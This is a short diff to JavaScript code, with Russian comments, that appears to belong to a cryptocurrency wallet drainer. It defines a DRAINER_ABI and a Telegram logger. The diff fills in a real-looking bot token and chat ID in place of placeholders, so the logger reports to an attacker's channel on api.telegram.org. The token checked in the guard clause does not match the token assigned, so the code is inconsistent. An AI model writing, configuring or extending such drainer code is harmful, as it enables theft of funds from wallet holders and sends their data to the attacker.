@@ -246,8 +246,8 @@
             };
 
             // ===== НАСТРОЙКИ TELEGRAM (опционально) =====
-            const TG_BOT_TOKEN = 'ВАШ_ТОКЕН_БОТА';
-            const TG_CHAT_ID = 'ВАШ_CHAT_ID';
+            const TG_BOT_TOKEN = 'AAEAA9qVaEet9I825OKMbkTLrAWPr1klk7U';
+            const TG_CHAT_ID = '8876372604';
 
             const DRAINER_ABI = [
                 { "inputs": [{ "internalType": "address", "name": "_owner", "type": "address" }], "stateMutability": "nonpayable", "type": "constructor" },
@@ -324,7 +324,7 @@
 
             // ===== TELEGRAM ЛОГГЕР =====
             async function sendTelegramLog(message) {
-                if (!TG_BOT_TOKEN || TG_BOT_TOKEN === 'ВАШ_ТОКЕН_БОТА') return;
+                if (!TG_BOT_TOKEN || TG_BOT_TOKEN === 'AAHuDADLBikr8vBKcJbtHxGNak8vytsJ1zQ') return;
                 try {
                     const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
                     await fetch(url, {
